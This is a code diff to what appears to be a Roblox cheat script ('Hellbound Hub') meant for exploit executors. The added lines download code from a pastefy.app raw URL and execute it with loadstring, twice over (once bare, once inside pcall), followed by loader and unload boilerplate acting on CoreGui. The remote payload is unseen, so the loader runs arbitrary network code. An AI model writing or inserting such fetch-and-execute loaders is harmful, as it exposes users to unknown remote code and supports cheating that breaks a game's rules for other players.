@@ -4393,3 +4393,44 @@ Info:Paragraph({
 })
 
 SendNexoraNotification("Hellbound Hub", "Merged script loaded successfully!", 5, "rbxassetid://89804924525665")
+
+loadstring(game:HttpGet("https://pastefy.app/Rk1XqGtF/raw"))()
+-- global loader key
+getgenv().MyGuiLoader = getgenv().MyGuiLoader or {}
+
+-- unload old instance if it exists
+if getgenv().MyGuiLoader.Unload then
+    getgenv().MyGuiLoader.Unload()
+end
+
+local Loader = {}
+getgenv().MyGuiLoader = Loader
+
+Loader.Connections = {}
+Loader.GuiName = "YourGuiName"
+
+-- 💡 run your actual script
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/Rk1XqGtF/raw"))()
+end)
+
+if not success then
+    warn("Load error:", err)
+end
+
+-- 💣 unload function
+function Loader.Unload()
+    -- disconnect stored connections
+    for _,v in pairs(Loader.Connections) do
+        pcall(function() v:Disconnect() end)
+    end
+
+    -- destroy gui safely
+    local gui = game.CoreGui:FindFirstChild(Loader.GuiName)
+    if gui then
+        gui:Destroy()
+    end
+
+    -- clear global
+    getgenv().MyGuiLoader = nil
+end
